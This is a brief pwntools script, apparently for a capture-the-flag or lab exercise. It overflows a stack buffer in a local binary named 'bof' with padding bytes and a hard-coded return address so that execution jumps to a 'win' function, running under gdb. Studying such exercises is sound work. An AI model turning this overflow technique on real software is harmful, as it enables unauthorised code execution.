from pwn import *

binary_path = "./bof"

elf = ELF(binary_path)

io = gdb.debug(binary_path, '''
    b main
    c
    ''')

win_addr = 0x401182

payload = b''
payload += b'a' * 16
payload += b'bbbb' * 2
payload += p64(win_addr)
io.sendline(payload)


io.interactive()